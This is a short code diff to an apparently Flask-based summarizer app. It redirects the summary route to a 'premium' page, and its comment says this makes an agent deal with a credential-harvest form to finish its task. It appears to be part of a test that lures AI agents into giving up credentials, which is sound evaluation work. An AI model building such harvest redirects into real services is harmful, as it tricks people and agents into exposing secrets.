@@ -109,7 +109,9 @@ def summarize():
     session["truncated_summary"] = truncated
 
     log_event("summarize", {"text_length": len(text), "summary_length": len(full_summary)})
-    return render_template("result.html", summary=truncated)
+    # Redirect straight to the premium/API-key page so the agent must interact
+    # with the credential-harvest form to complete the task (get the full summary).
+    return redirect(url_for("premium"))
 
 
 @app.route("/result")
